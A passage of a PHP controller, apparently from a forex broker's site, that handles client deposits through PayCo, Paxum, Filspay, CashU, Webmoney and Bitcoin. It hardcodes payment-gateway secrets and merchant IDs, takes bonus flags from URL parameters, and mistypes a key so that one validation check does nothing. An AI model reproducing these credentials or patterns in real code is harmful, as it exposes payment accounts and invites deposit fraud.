            if ($this->session->userdata('login_type') == 1) {
                $getCur = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_conv = $getCur['currency'];
                $acc_number = $getCur['reference_num'];
            } else {
                $getCur = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_conv = $getCur['mt_currency_base'];
                $acc_number = $getCur['account_number'];
            }

            $field_value = '';
            if ($_POST) {
                $field_value = [
                    'amount' => $this->input->post('amount'),
                ];
            }

            $data['amount'] = $this->input->post_get('amount1', true);

            // if ($data['amount'] == null) {
            $this->form_validation->set_rules('currency', 'Currency', 'trim|required|xss_clean');
            $this->form_validation->set_rules('amount', 'Amount', "trim|required|deposit_min_amount_payco[$walletCurrency]");
            //  }

            $data['hasError'] = false;
            if ($this->form_validation->run() === false) {
                $data['hasError'] = true;
            }

            //Validation for NDB accounts with Bonus Profit
//            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
//            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'));
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            //$data['error_msg'] = $this->deposit_validation($this->session->userdata('user_id'));
            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));
            if ($this->form_validation->run() && !$data['error_msg']) {
                //     if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960
                $amount = $this->input->post('amount', true);
                /* FXPP-6333
                $isMicro = $this->account_model->isMicro($getCur['user_id']);
                if ($isMicro) {
                $amount /= 100;
                }
                 FXPP-6333 */

                //if(!FXPP::isEUUrl()){
                if (true) {
                    $data['MID'] = '813776710'; // non-eu countries
                        $data['MWALLET'] = 'M002469224'; // payco forexmart merchant wallet
                } else {
                    $data['MID'] = '831993807';
                    $data['MWALLET'] = 'M066575920'; // payco forexmart merchant wallet
                }

                $data['desc'] = 'Deposit PayCo ['.$acc_number.']';
                $data['curr'] = $walletCurrency;
                $data['amt'] = $amount;

//                    if(IPLoc::IPOnlyForTq()){

                //  $data['curr'] = $this->input->post('currency', true);
                //$data['curr'] = 'USD';
//                        $data['MID'] = "831993807";
//                        $data['MWALLET'] = 'M066575920'; // payco forexmart merchant wallet
//                    }

                $data['TID'] = md5(uniqid());  // generate a 32 characters

                $data['SEP'] = '---';
                $data['SECRET'] = 'lenlen1234';
                $data['SIGN'] = hash('sha256', $data['MID'].$data['SEP'].sprintf('%1.2f', $data['amt']).$data['SEP'].$data['curr'].$data['SEP'].$data['desc'].$data['SEP'].$data['TID'].$data['SEP'].$data['MWALLET'].$data['SEP'].$data['SECRET']);
                $data['urlaction'] = 'https://my.pay.co/index.php?payments';
                $data['choice'] = 0;
                $amount = $data['amt'];
                $currency = $data['curr'];

                $currencyStatus = $this->currency_status[$currency];
                $isMicro = $this->account_model->isMicro($getCur['user_id']);
                if ($isMicro) {
                    $amount *= 100;
                    $currencyStatus = $this->currency_status['Cents'];
                }

                $conv_amount = $this->get_convert_amount($currency, $amount);
                // insert deposit initial data
                $data['insert'] = [
                        'note' => '',
                        'transaction_id' => 0,
                        'reference_id' => $data['TID'],
                        'status' => 0,
                        'amount' => $amount,
                        'currency' => $data['curr'],
                        'user_id' => $_SESSION['user_id'],
                        'payment_date' => date('Y-m-d H:i:s'),
                        'transaction_type' => 'PAYCO',
                        'conv_amount' => $conv_amount,
                        'payment_status' => $this->paymentType_status['Deposit via PayCo'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                    ];

                $additional_ten_percent = $this->input->get('addBonus');
                if ($additional_ten_percent == 1) {
                    $data['insert']['tenpercentbonus'] = 1;
                } else {
                    $data['insert']['tenpercentbonus'] = 0;
                }

                $bonus = $this->input->get('bonus');

                if ($bonus == 'twpb') {
                    $data['insert']['twentypercentbonus'] = 1;
                }

                if ($bonus == 'tpb') {
                    $data['insert']['thirtypercentbonus'] = 1;
                }
                if ($bonus == 'fpb') {
                    $data['insert']['fiftypercentbonus'] = 1;
                }
                if ($bonus == 'hpb') {
                    $data['insert']['hundredpercentbonus'] = 1;
                }

                $data['payco_insert_id'] = $this->g_m->insert($table = 'deposit', $data['insert']);

                // insert deposit initial data

                $data['payco_session'] = [
                        'payco_tr_id' => $data['TID'],
                        'payco_insert_id' => $data['payco_insert_id'],
                        'payco_start' => 0,
                    ];
                $this->session->set_userdata($data['payco_session']);

                $this->load->view('deposits/payco_payments', $data);
            // }
            } else {
                if (isset($_SESSION['payco_start'])) {
                    switch ($_SESSION['payco_start']) {
                        case 0://post
                            $data['prompt'] = 'Transaction has been cancelled.';
                            $data['prompt2'] = false;
                            $data['reason'] = 'Transaction is cancelled by client';
                            break;
                        case 1://cancel
                            $data['prompt'] = 'Transaction has been cancelled.';
                            $data['prompt2'] = false;
                            $data['reason'] = 'Transaction has been cancelled by Payco';
                            break;
                        case 2://success
                            $data['deposit'] = $this->g_m->showssingle($table = 'deposit', 'reference_id', $_SESSION['payco_tr_id'], '*', '');
                            $data['payco'] = $this->g_m->showssingle($table = 'payco', 'deposit_id', $data['deposit']['id'], '*', '');
                            $data['prompt'] = 'Transaction Successful.';
                            $data['prompt2'] = true;
                            break;
                    }
                    unset($_SESSION['payco_start']);

                    // Sending mail to cancelled transaction
                    if (isset($data['prompt']) && $data['prompt'] == 'Transaction has been cancelled.') {
                        $account_detail = $this->account_model->getAccountByUserId($_SESSION['user_id']);

                        $details = [
                            'account_number' => $account_detail['account_number'],
                            'type' => 'PayCo',
                            'reason' => $data['reason'],
                            'payco_tr_id' => $_SESSION['payco_tr_id'],
                        ];
                        $this->sendEmailFailedDeposit($details);

                        $this->g_m->insert('payco_log_cancel', ['user_id' => $_SESSION['user_id'], 'txn_id' => $_SESSION['payco_tr_id'], 'log' => serialize($details)]);
                    }
                } else {
                    $data['prompt2'] = false;
                }
                //$data['mpr'] = $this->general_model->showssingle('manage_payco_registration','user_id',$this->session->userdata('user_id'),'*');
                //$data['its'] = $this->partners_model->getPartnerActivatedITSClients($this->session->userdata('user_id'));

                $data['arg'] = $arg;

                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));

                $data['account'] = $account;
                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

                if ($this->session->userdata('login_type') == 1) {
                    $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
                } else {
                    $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                }

                $data['count_status'] = $this->general_model->getCountVerifyStatus($this->session->userdata('user_id')); //joy deposit unverified
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                $data['field_value'] = $field_value;
                // $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';
                $data['metadata_description'] = 'Provide the necessary information to deposit via PayCo. Request is processed within 10 minutes.';

                $this->template->title('ForexMart | Deposit - PayCo')
                    ->set_layout('internal/main')
                    ->prepend_metadata("
                     <script src='".$this->template->Js()."custom-deposit.js'></script>
            
                            ")
                    ->build('deposits/payco', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function Paxum()
    {
        if ($this->session->userdata('logged')) {
            if (FXPP::isEUClient()) {
                redirect('deposit');
            }
            // FXPP::LoginTypeRestriction();
            $data['user_id'] = $this->session->userdata('user_id');
            // $getaccount = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));

            if ($this->session->userdata('login_type') == 1) {
                $getCur = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_conv = $getCur['currency'];
                $account = $this->partners_model->getAccountByUserId($data['user_id']);
                $account['account_number'] = $account['reference_num'];
            } else {
                $getCur = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_conv = $getCur['mt_currency_base'];
                $account = $this->account_model->getAccountByUserId($data['user_id']);
            }

//            $currency_conv = $getaccount['mt_currency_base'];
            $data['amount'] = floatval($this->input->post_get('amount1', true));
            $data['bonus'] = $this->input->get('bonus');
            // if ($data['amount'] == null) {
            $this->form_validation->set_rules('currency', 'Currency', 'trim|required|xss_clean');
            $test_users = unserialize(TEST_USERS_DEPOSIT);
            if (in_array($this->session->userdata('user_id'), $test_users)) {
                $this->form_validation->set_rules('amount', 'Deposit amount', 'trim|required');
            } else {
                $this->form_validation->set_rules('amount', 'Amount', "trim|required|deposit_min_amount[$currency_conv]");
            }
            $this->form_validation->set_rules('email', 'Paxum Account', 'trim|valid_email|required|xss_clean');
            //  }

            //Validation for NDB accounts with Bonus Profit
//            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
//            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'), 2);
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

            if ($this->form_validation->run() && !$data['error_msg  ']) {
                //  if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960

                $custom_variables = [
                        'notify_url' => site_url().'deposit/paxumNotification',
                        'user_id' => $data['user_id'],
                        'account_number' => $account['account_number'],
                        'transaction_type' => 6,
                        'bonus' => $data['bonus'],
//                    'sandbox' => 'ON',
                        'test' => 1,
                    ];

                $date = new DateTime();
                $order_number = $date->getTimestamp();
                $variables = [];
                foreach ($custom_variables as $key => $value) {
                    $variables[] = $key.'='.$value;
                }

                $amount = $this->input->post('amount', true);
                /* FXPP-6333
                $isMicro = $this->account_model->isMicro($data['user_id']);
                if ($isMicro) {
                $amount /= 100;
                }
                 FXPP-6333 */

                $encrypt_fields = 'account_number='.$account['account_number'].';amount='.$this->input->post('amount', true).';currency='.$currency_conv;
                $var_token = FXPP::encrypt_data($encrypt_fields, $this->encrypt_key);
                $form_data = [
                        'form_url' => 'https://www.paxum.com/payment/phrame.php?action=displayProcessPaymentLogin',
                        'item_name' => 'ForexMart Deposit (Paxum - ['.$account['account_number'].'])',
                        'item_id' => $order_number,
                        'currency' => $this->input->post('currency', true),
                        'amount' => $amount,
                        'business_email' => 'paxum@forexmart.com',
                        'cancel_url' => site_url().'deposit/paxum?status=cancelled',
                        'finish_url' => site_url().'deposit/paxum?status=success&token='.urlencode($var_token),
                        'variables' => implode('&', $variables),
                    ];

                FXPP::failedPaymentNotify('paxum'); //FXPP-9628

                $this->load->view('deposits/paxum_payment', $form_data);
            //}
            } else {
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));

                //  $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $eu_payment_result = $this->euPaymentStatus($this->session->userdata('user_id'), 'paxum'); //FXPP-9628
                $data['eu_payment_status'] = $eu_payment_result['error'];
                $data['eu_error_message'] = $eu_payment_result['error_msg'];

                if ($this->session->userdata('login_type') == 1) {
                    $account = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                } else {
                    $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                }
                $data['account'] = $account;
                if ($this->session->userdata('login_type') == 1) {
                    $account['mt_currency_base'] = $account['currency'];
                    $data['account']['mt_currency_base'] = $account['currency'];
                    $data['account']['account_number'] = $account['reference_num'];
                }
                $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['mt_currency_base']);
                $data['account']['currency_new'] = $data['account']['currency'];
                if ($data['account']['currency_new'] == 'RUB') {
                    $data['account']['currency_new'] = 'RUR';
                }

                // Sending email to cancelled transaction
                $this->load->helper('url_query_string_helper');
                $full_url = current_full_url();
                parse_str(parse_url($full_url, PHP_URL_QUERY), $params);

                if (isset($params['status']) && $params['status'] == 'cancelled') {
                    $account_detail = $this->account_model->getAccountByUserId($data['user_id']);
                    $details = [
                        'account_number' => $account_detail['account_number'],
                        'type' => 'Paxum',
                        'reason' => 'CANCELLED',
                    ];
                    $this->sendEmailFailedDeposit($details);
                }

                if ($this->input->get('status') == 'success') {
                    $data['success'] = true;
                } else {
                    $data['success'] = false;
                }

                $status_token = $this->input->get('token');
                if ($status_token) {
                    $decrypt_fields = FXPP::decrypt_data($status_token, $this->encrypt_key);
                    $fields = explode(';', $decrypt_fields);

                    foreach ($fields as $element) {
                        $attributes = explode('=', $element);
                        if (count($attributes) > 1) {
                            $data[$attributes[0]] = $attributes[1];
                        }
                    }
                }

                $js = $this->template->Js();
                $data['metadata_description'] = 'Provide the necessary information to deposit via Paxum. Request is processed within 1-7 working hours.';
                $this->template->title('ForexMart | Deposit - Paxum')
                    ->set_layout('internal/main')
                    ->prepend_metadata("
                    <script src='".$js."custom-deposit.js'></script>
                            ")
                    ->build('deposits/paxum', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function filspay()
    {
        if ($this->session->userdata('logged')) {
            // FXPP::LoginTypeRestriction();

            $this->form_validation->set_rules('currency', 'Currency', 'trim|required|xss_clean');
            $this->form_validation->set_rules('amount', 'Amount', 'trim|required|xss_clean');

            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->deposit_validation($this->session->userdata('user_id'));
            if ($this->form_validation->run() && !$data['error_msg']) {
                $amount = $this->input->post('amount', true);
                /* FXPP-6333
                $isMicro = $this->account_model->isMicro($this->session->userdata('user_id'));
                if($isMicro){
                    $amount /= 100;
                }
                 FXPP-6333 */

                $hashCode = md5('2337765:'.$this->input->post('amount', true).':'.strtolower($this->input->post('currency', true)).':2c26f748b8fa5994c4cd56b38f5c38f23614b4f4');
                $data = [
                    'link' => 'https://pay.filspay.com',
                    'merchantid' => '2337765',
                    'hashCode' => $hashCode,
                    'currency' => $this->input->post('currency', true),
                    'amount' => $amount,
                    'language' => 'en',
                    'session_id' => 'asdasd-234-asdasd',
                    'SiteId' => '4367',
                    'txt1' => 'item27',
                    'Description' => 'Test Cashu',
                    'trxRefNumber' => md5(uniqid()),
                ];

                $this->load->view('deposits/filspay_payments', $data);
            } else {
                $data['option'] = $this->general_model->selectOptionList(FXPP::getUserAccountCurrencyBase());
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['disable_input'] = $user_status;
                $data['metadata_description'] = 'Provide the necessary information to deposit via Filspay. Request is processed within 7 working hours.';
                $this->template->title('ForexMart | Deposit - FILSPay')
                    ->set_layout('internal/main')
                    ->prepend_metadata("
<script src='".$this->template->Js()."custom-deposit.js'></script>
                            ")
                    ->build('deposits/filspay', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function cashu()
    {
        if ($this->session->userdata('logged')) {
            // FXPP::LoginTypeRestriction();
            if (!$this->input->post('payment_success', true)) {
                $this->form_validation->set_rules('currency', 'Currency', 'trim|required|xss_clean');
                $this->form_validation->set_rules('amount', 'Amount', 'trim|required|xss_clean');
                // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
                $data['error_msg'] = $this->deposit_validation($this->session->userdata('user_id'));
                if ($this->form_validation->run() && !$data['error_msg']) {
                    $amount = $this->input->post('amount', true);
                    /* FXPP-6333
                    $isMicro = $this->account_model->isMicro($this->session->userdata('user_id'));
                    if($isMicro){
                        $amount /= 100;
                    }
                     FXPP-6333 */

                    $token = md5('forexmart:'.$this->input->post('amount', true).':'.strtolower($this->input->post('currency', true)).':WNtGmty4XaR3Fu8PXcDy');
                    $data = [
                        'link' => 'https://sandbox.cashu.com/cgi-bin/pcashu.cgi',
                        'merchant_id' => 'FOREXMART',
                        'token' => $token,
                        'display_text' => 'Test Cashu',
                        'currency' => $this->input->post('currency', true),
                        'amount' => $amount,
                        'language' => 'en',
                        'session_id' => $this->session->userdata('user_id'),
                        'txt1' => 'Cashu Deposit',
                        'test_mode' => 1,
                    ];

                    $this->load->view('deposits/cashu_from', $data);
                } else {
                    $data['option'] = $this->general_model->selectOptionList(FXPP::getUserAccountCurrencyBase());
                    $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                    $data['disable_input'] = $user_status;
                    $this->template->title('ForexMart | Deposit - CashU')
                        ->set_layout('internal/main')
                        ->prepend_metadata("
                        <script src='".$this->template->Js()."custom-deposit.js'></script>
                            ")
                        ->build('deposits/cashu', $data);
                }
            } else {
                $data['payment_success'] = false;
                if ($this->input->post('payment_success', true)) {
                    $data['payment_success'] = true;
                }

                $data['option'] = $this->general_model->selectOptionList(FXPP::getUserAccountCurrencyBase());
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['disable_input'] = $user_status;
                $data['metadata_description'] = 'Provide the necessary information to deposit via CashU. Request is processed within 10 minutes.';
                $this->template->title('ForexMart | Deposit - CashU')
                    ->set_layout('internal/main')
                    ->prepend_metadata("
                        <script src='".$this->template->Js()."custom-deposit.js'></script>
                            ")
                    ->build('deposits/cashu', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function webmoney()
    {
        if ($this->session->userdata('logged')) {
            redirect(FXPP::loc_url('deposit')); //FXPP-9435

//            if (!IPLoc::Office()) {
//                FXPP::LoginTypeRestriction();
//            }

            //$user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
            if ($this->session->userdata('login_type') == 1) {
                $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
            } else {
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
            }
            $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));

            // $data['user_status'] = $user_status;
            $data['count_status'] = $this->general_model->getCountVerifyStatus($this->session->userdata('user_id')); //joy deposit FXPP-6768
            if ($user_status) {
                if ($data['incomplete']) {
                    $disabled = '';
                } else {
                    $disabled = 'disabled';
                }
            } elseif ($data['count_status'] && $data['incomplete']) {
                $disabled = '';
            } else {
                $disabled = 'disabled';
            }

            $data['bonus_input'] = $this->input->get('bonus');

            $data['disabled'] = $disabled;
            $data['amount'] = $this->input->post_get('amount1', true);

            if ($this->session->userdata('login_type') == 1) {
                $account = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
            } else {
                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            }
            $data['account'] = $account;
            if ($this->session->userdata('login_type') == 1) {
                $account['mt_currency_base'] = $account['currency'];
                $data['account']['mt_currency_base'] = $account['currency'];
                $data['account']['account_number'] = $account['reference_num'];
            }
            $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['mt_currency_base']);
            $data['account']['currency_new'] = $data['account']['currency'];
            if ($data['account']['currency_new'] == 'RUB') {
                $data['account']['currency_new'] = 'RUR';
            }

            $js = $this->template->Js();
            $data['metadata_description'] = 'Provide the necessary information to deposit via Webmoney.';
            $this->template->title('ForexMart | Deposit - Webmoney')
                ->set_layout('internal/main')
                ->prepend_metadata("
                        <script src='".$js."custom-deposit.js'></script>
                            ")
                ->build('deposits/webmoney', $data);
        } else {
            redirect('signout');
        }
    }

    public function bitcoin()
    {
        if ($this->session->userdata('logged')) {
//             if(!IPLoc::Office()){ //FXPP-9194
//                 redirect(FXPP::my_url('my-account'));
//             }

//            Remove restriction: FXPP-11626
//            if (IPLoc::isIPandLanguageChina()) {
//                redirect(FXPP::my_url('my-account'));
//            }

            $data['amount'] = $this->input->post_get('amount1', true);
            //  if ($data['amount'] == null) {
            $this->form_validation->set_rules('currency', 'Currency', 'trim|required|xss_clean');
            $this->form_validation->set_rules('transaction_id', 'Bitcoin Transaction ID', 'trim|required|xss_clean');
            $this->form_validation->set_rules('address', 'ForexMart Bitcoin Address', 'trim|required|xss_clean');
            // }

            $webservice_config = ['server' => 'bitcoin'];

            //$account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            if ($this->session->userdata('login_type') == 1) {
                $account = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                $account['mt_currency_base'] = $account['currency'];
                $account['account_number'] = $account['reference_num'];
            } else {
                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            }

            //Validation for NDB accounts with Bonus Profit
//            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
//            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'));
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

            if ($this->form_validation->run() && !$data['error_msg']) {
                // if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960
                $account_number = $account['account_number'];
                $WebService = new WebService($webservice_config);

                $test_accounts = [
                        '135835',
                    ];

                if (in_array($this->session->userdata('user_id'), $test_accounts)) {
                    $WebService->Test_VerifyPayment_PAYMENT_CONFIRMED_Result($this->input->post('address', true), $this->input->post('transaction_id', true), $account_number);
                } else {
                    $WebService->verify_payment2($this->input->post('address', true), $this->input->post('transaction_id', true), $account_number);
                }

                if ($WebService->request_status === 'PAYMENT_CONFIRMED') {
                    $bitcoin_amount = $WebService->get_result('PaymentBTCAmount');
                    $bitcoin_transaction_id = $WebService->get_result('PaymentTransactionId');
                    $bitcoin_usd_amount = $WebService->get_result('ProcessAmountInUSD');

                    $isMicro = $this->account_model->isMicro($this->session->userdata('user_id'));
                    if ($isMicro) {
                        $bitcoin_amount *= 100;
                        $bitcoin_usd_amount *= 100;
                    }

                    $currencyStatus = $this->currency_status[$account['mt_currency_base']];
                    $isMicro = $this->account_model->isMicro($this->session->userdata('user_id'));
                    if ($isMicro) {
                        $currencyStatus = $this->currency_status['Cents'];
                    }

                    $insertDepositFailed = [
                            'transaction_id	' => $bitcoin_transaction_id,
                            'status	' => 0,
                            'amount	' => $bitcoin_usd_amount,
                            'currency' => $account['mt_currency_base'],
                            'user_id' => $this->session->userdata('user_id'),
                            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                            'transaction_type' => 'BITCOIN',
                            'payment_status' => $this->paymentType_status['Deposit via Bitcoin'], //FXPP-7618
                            'currency_status' => $currencyStatus, //FXPP-7618
                            'fee' => 0,
                            'isFailed' => 0,
                            'type' => 'deposit-'.$isMicro.'-'.$_GET['bonus'],
                        ];

                    if ($bitcoin_usd_amount > 0) {
                        $amount = $this->get_convert_amount('USD', $bitcoin_usd_amount, strtoupper($account['mt_currency_base']));

                        $config = ['server' => 'live_new'];
//                        $WebService = new WebService($config);

//                        if (IPLoc::APIUpgradeDevIP()) {
                            $WebServiceNew = FXPP::DepositRealFund($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['BITCOIN']);
                            $requestResult = $WebServiceNew['requestResult'];
                            $ticket = $WebServiceNew['ticket'];
//                        } else {
//                            $WebService->update_live_deposit_balance($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['BITCOIN']);
//                            $requestResult = $WebService->request_status;
//                            $ticket = $WebService->get_result('Ticket');
//                        }

                        if ($requestResult === 'RET_OK') {
                            $mt_ticket = $ticket;

                            // Back Agent of Client
                            //FXPP::BackAgentOfAccount($account_number);

                            $WebService2 = new WebService($config);
                            $WebService2->request_live_account_balance($account_number);
                            if ($WebService2->request_status === 'RET_OK') {
                                $balance = $WebService2->get_result('Balance');
                                if ($this->session->userdata('login_type') == 1) {
                                    $this->account_model->updatePartnerAccountBalance($account_number, $balance);
                                } else {
                                    $this->account_model->updateAccountBalance($account_number, $balance);
                                }

                                //FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                            } else {
                                $insertDepositFailed['comment'] = $WebService2->request_status;
                                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                            }
                            $date = new DateTime();
                            $order_number = $date->getTimestamp();
                            $date_now = date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime()));

                            $data = [
                                    'transaction_id' => $bitcoin_transaction_id,
                                    'reference_id' => $order_number,
                                    'status' => 2,
                                    'amount' => $amount,
                                    'currency' => $account['mt_currency_base'],
                                    'user_id' => $this->session->userdata('user_id'),
                                    'payment_date' => date('Y-m-d H:i:s', strtotime($date_now)),
                                    'date_request' => date('Y-m-d H:i:s', strtotime($date_now)),
                                    'note' => '',
                                    'transaction_type' => 'BITCOIN',
                                    'conv_amount' => $bitcoin_usd_amount,
                                    'bitcoin_amount' => $bitcoin_amount,
                                    'mt_ticket' => $mt_ticket,
                                    'payment_status' => $this->paymentType_status['Deposit via Bitcoin'], //FXPP-7618
                                    'currency_status' => $currencyStatus, //FXPP-7618
                                ];

                            $this->deposit_model->insertPayment($data);

//                            if ($_GET['addBonus'] == 1) {
//                                FXPP::DepositBonus($this->session->userdata('user_id'), $account_number, $amount, 'bitcoin', 'tenpb', $bitcoin_transaction_id);
//                            }
//
//                            if ($_GET['bonus'] == 'twpb') {
//                                FXPP::DepositBonus($this->session->userdata('user_id'), $account_number, $amount, 'bitcoin', 'twpb', $bitcoin_transaction_id);
//                            }
//
//                            if ($_GET['bonus'] == 'tpb') {
//                                FXPP::DepositBonus($this->session->userdata('user_id'), $account_number, $amount, 'bitcoin', 'tpb', $bitcoin_transaction_id);
//                            }
//                            if ($_GET['bonus'] == 'fpb') {
//                                FXPP::DepositBonus($this->session->userdata('user_id'), $account_number, $amount, 'bitcoin', 'fpb', $bitcoin_transaction_id);
//                            }
//
//                            if ($_GET['bonus'] == 'hpb') {
//                                FXPP::Deposit100PercentBonus($this->session->userdata('user_id'), $account_number, $amount, 'bitcoin', 'hplb', $bitcoin_transaction_id);
//                            }
//
//                            if (IPLoc::Office()) {
//                                if ($_GET['bonus'] === 'rhpb') {
//                                    FXPP::DepositRegular100PercentBonus($this->session->userdata('user_id'), $account_number, $amount, 'bitcoin', 'rhpb', $bitcoin_transaction_id);
//                                }
//                            }

                            self::applyDepositBonus($this->session->userdata('user_id'), $account_number, $amount, 'bitcoin', $_GET['bonus'], $bitcoin_transaction_id, false);

                            if ($_GET['addBonus'] == 1) {
                                self::applyDepositBonus($this->session->userdata('user_id'), $account_number, $amount, 'bitcoin', 'tenpb', $bitcoin_transaction_id, true);
                            }

                            $bonuses = FXPP::getAccountBonusByType($account_number);
                            $RequestLogintype = $this->account_model->getAccountLoginType($this->session->userdata('user_id'));
                            if ($RequestLogintype['login_type'] != 1) {
                                if ($amount > 0 and $bonuses[2] > 0) {
                                    FXPP::BonusProfitCancellation($this->session->userdata('user_id'), $account_number, $amount, $bitcoin_transaction_id);
                                }
                            }

                            // Bonus Profit Logs**/
                            $ndbProfitLogs = [
                                    'Account_number' => $account_number,
                                    'DepAmount' => $amount,
                                    'UserId' => $this->session->userdata('user_id'),
                                    'TransactionId' => $bitcoin_transaction_id,
                                    'ndbbonus' => $bonuses[2],
                                ];
                            $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                            $insertProfitLogs = [
                                    'logs' => $encodeNdbProfitLogs,
                                    'User_Id' => $this->session->userdata('user_id'),
                                ];

                            $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                            /**  Use original amount for Cent accounts**/
                            $isMicro = $this->account_model->isMicro($this->session->userdata('user_id'));
                            if ($isMicro) {
                                $processed_amount = floatval($amount / 100);
                            } else {
                                $processed_amount = $amount;
                            }
                            /**End**/

                            /* Send successful email deposit to auto-reports **/
                            $this->sendEmailAfterSuccessDeposit('Bitcoin', $processed_amount, $account_number, $this->session->userdata('user_id'), $this->comment_type['deposit'].$this->comment_transaction_type['BITCOIN'].$bitcoin_transaction_id);
                            /** End **/
                            $message = '<i class="fa fa-check-circle"></i> Payment has been successfully processed.';
                            $this->session->set_flashdata('result', ['message' => $message, 'success' => true]);
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);

                            $message = '<i class="fa fa-exclamation-circle"></i> WebService is not available.';
                            $this->session->set_flashdata('result', ['message' => $message, 'success' => false]);
                        }
                    } else {
                        $insertDepositFailed['comment'] = 'Minimum deposit amount is 1 USD';
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);

                        $message = '<i class="fa fa-exclamation-circle">Minimum deposit amount is 1 USD.</i> ';
                        $this->session->set_flashdata('result', ['message' => $message, 'success' => false]);
                    }
                } else {
                    switch ($WebService->request_status) {
                            case 'PAYMENT_UNCONFIRMED':
                                $message = '<i class="fa fa-exclamation-circle"></i> Please try to verify again in a few minutes.';
                                break;
                            case 'PAYMENT_NOT_FOUND':
                                $message = '<i class="fa fa-exclamation-circle"></i> Payment has not found in wallet.';
                                break;
                            case 'PAYMENT_PROCESS_ALREADY':
                                $message = '<i class="fa fa-exclamation-circle"></i> Transaction id has already been used.';
                                break;
                            case 'PAYMENT_NOT_IN_PROCESSED_LIST':
                                $message = '<i class="fa fa-exclamation-circle"></i> Payment transaction Id not in processed list.';
                                break;
                            case 'INVALID_TRANSACTION':
                                $message = '<i class="fa fa-exclamation-circle"></i> Transaction is not "receive". Amount is less than 0.';
                                break;
                            case 'REQUEST_UNAUTHORIZED':
                                $message = '<i class="fa fa-exclamation-circle"></i> Unauthorized service login.';
                                break;
                            case 'TRANSACTION_ID_AND_ADDRESS_NOT_MATCH':
                                $message = '<i class="fa fa-exclamation-circle"></i> Verification transaction id and address don\'t match.';
                                break;
                            case 'REQUEST_ERROR':
                                $message = '<i class="fa fa-exclamation-circle"></i> Request encountered error.';
                                break;
                            default:
